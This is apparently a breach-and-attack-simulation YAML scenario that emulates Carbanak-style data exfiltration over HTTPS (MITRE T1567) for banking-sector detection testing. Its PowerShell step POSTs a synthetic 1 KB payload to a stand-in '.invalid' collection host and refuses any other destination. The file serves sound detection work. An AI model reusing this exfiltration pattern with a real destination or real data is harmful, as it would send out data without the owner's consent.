id: carbanak-bfsi-https-exfil-sim
product_line: killchain
name: Carbanak BFSI HTTPS Financial Data Exfiltration Simulation (Item 32)
description: >
  Sends a SYNTHETIC payload over HTTPS to a .invalid name, which never
  resolves, so no data leaves the lab. A destination that is not a .invalid
  name is refused before anything is sent. [BAS-SIM-CARBANAK-S32] tagged.
  Grounded in MITRE ATT&CK T1567 (Exfiltration Over Web Service): data goes to a web destination, not over an existing C2 channel.
author: Audspect Research
executable: true
local_check: false
supported_os: [windows]
tags:
  - carbanak
  - bfsi
  - exfiltration
  - t1567
mitre_phases:
  - exfiltration

live_policy:
  block_on_domain_controller: false
  require_dc_reachable: false
  max_spray_attempts: 0
  spray_account_allowlist: []
  execution_window: ""

steps:
  - name: "Carbanak Item 32 -- HTTPS Financial Data Exfiltration Simulation (T1567)"
    technique_id: T1567
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 60
    fidelity: lab-only
    production_safe: true
    risk: low
    blast_radius: "One HTTPS POST of 1 KB of synthetic text to a .invalid name, which does not resolve. Nothing real is sent."
    reversible: true
    telemetry:
      - "Sysmon EID 3 for the outbound HTTPS attempt, and proxy logs where present"
    detection:
      - "SIEM/EDR: outbound HTTPS POST of a synthetic payload to a non-production name by a non-administrative process"
    threat_intel_sources:
      - reference: "MITRE ATT&CK -- T1567"
        url: "https://attack.mitre.org/techniques/T1567/"
    last_reviewed: "2026-11-21"
    family_attribution_confidence: reported
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $dest = 'https://bas-exfil-sim.invalid/collect'
      $destHost = ([uri]$dest).Host
      if ($destHost -notmatch '\.invalid$') { Write-Output "REFUSED: exfiltration simulation destination must be a .invalid name."; exit 1 }
      $body = 'Synthetic payload - BAS test data, not real. ' + ('x' * 1024)
      $reached = $false
      try {
        Invoke-WebRequest -Uri $dest -Method Post -Body $body -TimeoutSec 5 -UseBasicParsing | Out-Null
        $reached = $true
      } catch { }
      Write-Output "EXEC 32: synthetic payload sent to a .invalid host; reached=$reached (expected false: .invalid never resolves). [BAS-SIM-CARBANAK-S32]"
    cleanup: ""
